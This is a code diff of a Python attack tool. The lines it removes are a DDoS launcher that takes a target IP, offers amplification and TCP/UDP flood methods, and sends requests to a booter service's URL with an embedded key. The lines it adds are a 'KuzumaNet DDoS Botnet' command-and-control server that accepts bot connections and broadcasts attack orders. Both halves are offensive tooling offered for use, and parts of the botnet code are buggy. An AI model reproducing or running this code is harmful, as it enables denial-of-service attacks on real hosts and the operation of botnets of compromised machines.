@@ -23,64 +23,166 @@ print("""\033[93m
                DDoS Layer7 (DDoS) 💥
 """)
 print()
-ip=input("[×]  IP: => ")
-print('   Các Phương Thức Method:')
-print('   1. AMP-NTP')
-print('   2. AMP-DNS')
-print('   3. AMP-DVR (High PPS)')
-print('   4. AMP-SSDP (High PPS)')
-print('   5. AMP-SNMP (High PPS)')
-print('   6. TCP-SYN (High PPS)')
-print('   7. TCP-ACK (High PPS)')
-print('   8. TCP-AMP (SYN-ACK amplification)')
-print('   9. TCP-BYPASS')
-print('   10. UDP-MIX (UDP with mixed protocols)')
-print('   11. UDP-BYPASS (Sending random data)')
-print('   12. VALVE (TSource Engine Flood)')
-print('   13. Game-FiveM (Custom FiveM Payloads)')
-print('   14. OVH-AMP (Mix of amplifications flood)')
-print('   15. OVH-TCP')
-print('')
-method=input("   Vui Lòng Chọn Method: ")
-options=webdriver.ChromeOptions()	
-options.add_argument("--incognito")
-options.add_argument("--headless")
-options.add_argument("start-maximized")
-driver=webdriver.Chrome(options=options)
-if method == "1":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-NTP&format=html")
-elif method == "2":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-DNS&format=html")
-elif method == "3":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-DVR&format=html")
-elif method == "4":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-SSDP&format=html")
-elif method == "5":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon-SNMP&format=html")
-elif method == "6":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_SYN&format=html")
-elif method == "7":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_ACK&format=html")
-elif method == "8":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_AMP&format=html")
-elif method == "9":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_TCP_BY&format=html")
-elif method == "10":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_UDP_MIX&format=html")
-elif method == "11":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_UDP_BY&format=html")
-elif method == "12":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_VALVE&format=html")
-elif method == "13":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_FiveM&format=html")
-elif method == "14":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_OVH_AMP&format=html")
-elif method == "15":
-	driver.get(f"https://anonboot.net/?key=zblvvQwDWgDWA1yX&host={ip}&port=80&time=800&method=Anon_OVH_TCP&format=html")													
+import sys
+from sys import platform
+import os
+import socket
+import subprocess
+import time
+from time import sleep
+import colorama
+from colorama import Style, Fore 
+import threading as thread
+import _thread
+
+
+osystem = sys.platform
+
+if osystem == "linux":
+    os.system("clear")
 else:
-	exit()
-while True:
- driver.refresh()
- os.system("cls")
- print(f"Đang Tấn Công IP: {ip}")
- time.sleep(1)
+    os.system("cls")
+ 
+ 
+welcome ="""
+        Welcome to Kuzuma Network
+------------------------------------------
+"""
+time.sleep(1.7)
+if osystem == "linux":
+    os.system("clear")
+
+else:
+    os.system("cls")
+
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print("""
+KuzumaNet
+DDoS Botnet
+Discord: zSodex#3828 :D""")
+
+time.sleep(1.3)
+os.system("clear")
+print(Fore.RED+"""
+ ██ ▄█▀ █    ██ ▒███████▒ █    ██  ███▄ ▄███▓ ▄▄▄      
+ ██▄█▒  ██  ▓██▒▒ ▒ ▒ ▄▀░ ██  ▓██▒▓██▒▀█▀ ██▒▒████▄    
+▓███▄░ ▓██  ▒██░░ ▒ ▄▀▒░ ▓██  ▒██░▓██    ▓██░▒██  ▀█▄  
+▓██ █▄ ▓▓█  ░██░  ▄▀▒   ░▓▓█  ░██░▒██    ▒██ ░██▄▄▄▄██  
+▒██▒ █▄▒▒█████▓ ▒███████▒▒▒█████ ▒██▒   ░██▒ ▓█   ▓██▒
+▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ 
+░ ░▒ ▒░░░▒░ ░ ░ ░░▒ ▒ ░ ▒░░▒░ ░ ░ ░  ░      ░  ▒   ▒▒ ░░ ░
+░ ░░ ░  ░░░ ░ ░ ░ ░ ░ ░ ░ ░░░ ░ ░ ░      ░     ░   ▒      ░  
+░  ░      ░       ░ ░       ░            ░         ░  ░         
+                ░                                              
+""")
+time.sleep(3.3)
+os.system("clear")
+print(Fore.BLUE + "DDoS Botnet By zSodex :D ")
+print()
+listclientes = []
+
+
+
+def zombies():
+    
+    bots = 0 
+    for bots in listclientes:
+        bots =+1
+        print(f"[+] Bots: {bots}")
+
+
+
+
+def clientes(client_addr):
+     
+    
+    print(Fore.BLUE + f"[+] {client_addr[0]} | Just connected to Kuzuma")
+    print()
+    while True:
+
+        if comm.startswith ("attack"):
+            attack()
+        if comm == "bots":
+            zombies()
+
+        if comm == " ":
+            pass
+        if comm == ".":
+            pass
+
+        if comm == "exit":
+            for bots in listclientes:
+                comm = comm.encode()
+                bots.send(comm)
+                salida()
+             
+
+            
+
+ 
+        for bots in listclientes:
+            comm = comm.encode()
+            bots.send(comm)
+
+        
+
+def salida():
+    print("[+] Bots in listening again, thanks for using Kuzuma :D  ")
+    print("[*] Press CTRL-C to close the program!")
+            
+        
+
+
+def attack():
+    print(f"[+] Order sent to all zombies, be patient!")
+def crtserver():
+    global server
+    from colorama import Style, Fore 
+    lhost = input(Fore.RED + Style.BRIGHT + "[+] Enter server IP: => " )
+    print()
+    lport = int(input("[+] Enter server port: => "))
+    #lport = 4444
+
+    
+
+    if lhost == "":
+        lhost == 'localhost'
+        pass
+
+    try:
+
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.bind((lhost, lport))
+        server.listen()
+        print()
+        print("[+] Waiting For Bots Handshake...")
+    except KeyboardInterrupt:
+        server.close()
+         
+        
+
+     
+    while True:
+        try:
+            clientt, client_addr = server.accept()
+            _thread.start_new_thread(clientes, (client_addr,))
+            listclientes.append(clientt)
+            try:
+
+                output = clientt.recv(1024)
+                output = output.decode()
+                print(f"""
+                {output}""")
+                 
+            except:
+                pass
+
+
+        except KeyboardInterrupt:
+            print()
+            print("Byee!")
+            server.close()
+            break
+ 
+
+crtserver()
